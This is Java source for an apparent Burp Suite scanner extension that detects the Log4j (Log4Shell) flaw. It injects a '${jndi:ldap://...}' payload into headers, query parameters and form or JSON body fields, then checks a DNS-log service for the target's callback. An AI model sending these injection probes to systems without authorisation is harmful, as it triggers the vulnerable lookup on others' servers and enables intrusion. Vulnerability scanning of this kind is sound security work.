package burp.scan;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.common.Common;
import burp.common.YamlReader;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Log4jScan {
    static PrintWriter stdout;
    static boolean urlencode = false;
    static List<String> Features = new ArrayList<>();
    static String ceyeDomain = YamlReader.getInstance(BurpExtender.getCallbacks()).getString("dnsLog.domain");
    static List<String> Log4jScanHeaders = YamlReader.getInstance(BurpExtender.getCallbacks()).getStringList("scanModule.Log4jScan.ScanHeader");
    static List<String> scandone = new ArrayList<>();

    public synchronized static List<Object> ScanMain(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, PrintWriter out) throws IOException, InterruptedException {
        stdout = out;
        Features.clear();
        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        String baseurl = url.getProtocol() + "://" + url.getAuthority();
        if(!scandone.contains(Common.MD5(baseurl))){
            stdout.println("Log4j Rce Scan Start!");
            List<Object> Success = new ArrayList<>();
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            if(headers.contains("application/x-www-form-urlencoded")){
                stdout.println("检测到application/x-www-form-urlencoded");
                urlencode = true;
            }
            int size = headers.size();
            String methond = helpers.analyzeRequest(baseRequestResponse).getMethod();;
            //对head头添加poc
            for(int i=0;i<size;i++){
                String header = headers.get(i).split(":")[0];
                if(Log4jScanHeaders.contains(header)){
                    String poc = header + ": " + Getpoc();
                    headers.set(i,poc);
                }
            }
            //无论什么请求都有可能有？参数先直接进行处理
            headers.set(0,ParamAddPocGet(headers.get(0)));
            if(!methond.toLowerCase().equals("post")){
                byte[] body = helpers.buildHttpMessage(headers, null);
                IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                String data = Common.ceyeResult();
                for(String randString:Features){
                    if(data.contains(randString)){
                        stdout.println("Log4j Rce find! 匹配randString值为: " + randString);
                        scandone.add(Common.MD5(baseurl));
                        Success.add(requestResponse);
                        Success.add(randString);
                        return Success;
                    }
                }
            }else{
                int bodyOffset = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                String resp =new  String(baseRequestResponse.getRequest());
                String respbody = resp.substring(bodyOffset);
                byte[] request_bodys = ParamAddPocPost(respbody).getBytes();
                byte[] body = helpers.buildHttpMessage(headers, request_bodys);
                IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                String data = Common.ceyeResult();
                for(String randString:Features){
                    if(data.contains(randString)){
                        stdout.println("Log4j Rce find! 匹配randString值为: " + randString);
                        scandone.add(Common.MD5(baseurl));
                        Success.add(requestResponse);
                        Success.add(randString);
                        return Success;
                    }
                }
            }
            stdout.println("Log4j Rce Scan end!");
        }else{
            stdout.println(baseurl + " Log4j rce已扫描，跳过～");
        }
        return null;
    }


    //对get请求的参数添加poc
    public static String ParamAddPocGet(String header) throws UnsupportedEncodingException {
        List<String> heads = Arrays.asList(header.split(" "));
        if(heads.get(1).contains("?")){
            String uri_total = "";
            String[] requris = heads.get(1).split("\\?");
            String[] requries = requris[1].split("&");
            for (String uri_single : requries){
                String[] uri_single_lists = uri_single.split("=");
                uri_total = uri_total + uri_single_lists[0] + "=" + Getpoc() + "&";
            }
            uri_total = requris[0] + "?" + uri_total.substring(0,uri_total.length()-1);
            stdout.println(heads.get(0) + " " + uri_total + " " + heads.get(2));
            return heads.get(0) + " " + uri_total + " " + heads.get(2);
        }else{
            return header;
        }
    }

    public static String ParamAddPocPost(String body) throws UnsupportedEncodingException {
        if(body.contains("=") && !body.contains("{")){
            String body_total = "";
            String[] bodys_single = body.split("&");
            for(String body_single:bodys_single) {
                String[] body_single_lists = body_single.split("=");
                body_total = body_total + body_single_lists[0] + "="  + Getpoc() +  "&" ;
            }
            body_total = body_total.substring(0,body_total.length()-1);
            return body_total;
        }else if(!body.contains("=") && body.endsWith("}") && body.trim().replace("\\r","").endsWith("}")){
            JSONObject jsonObject = JSON.parseObject(body);
            for (String key:jsonObject.keySet()) {
                jsonObject.put(key, Getpoc());
            }
            return jsonObject.toString();
        }else if( body.contains("=") && body.contains("={") && body.contains("&")){
            String body_total = "";
            String[] bodys_single = body.split("&");
            for(String body_single:bodys_single) {
                if (body_single.contains("={")){
                    String[] body_single_lists = body_single.split("=");
                    JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                    for (String key:jsonObject.keySet()) {
                        jsonObject.put(key, Getpoc());
                    }
                    body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                }else {
                    String[] body_single_lists = body_single.split("=");
                    body_total = body_total + body_single_lists[0] + "=" + Getpoc() + "&";
                }
            }
            body_total = body_total.substring(0,body_total.length()-1);
            return body_total;
        }else if( !body.contains("&") && body.contains("\":{")){
            JSONObject jsonObject = JSON.parseObject(body);
            for (String key:jsonObject.keySet()) {
                if (jsonObject.getString(key).startsWith("{") && jsonObject.getString(key).endsWith("}")){
                    JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                    for (String key2:jsonObject2.keySet())
                        jsonObject2.put(key2,Getpoc());
                    jsonObject.put(key,jsonObject2);
                } else
                    jsonObject.put(key, Getpoc());
            }
            return jsonObject.toString();
        }else{
            return body;
        }
    }


    public static String Getpoc() throws UnsupportedEncodingException {
         String RandomString = Common.getRandomString(25);
         Features.add(RandomString);
         if(urlencode){
             return URLEncoder.encode("${jndi:ldap://" + RandomString + "." + ceyeDomain + "/h}","UTF-8");
         }else{
             return "${jndi:ldap://" + RandomString + "." + ceyeDomain + "/h}";
         }
    }
}
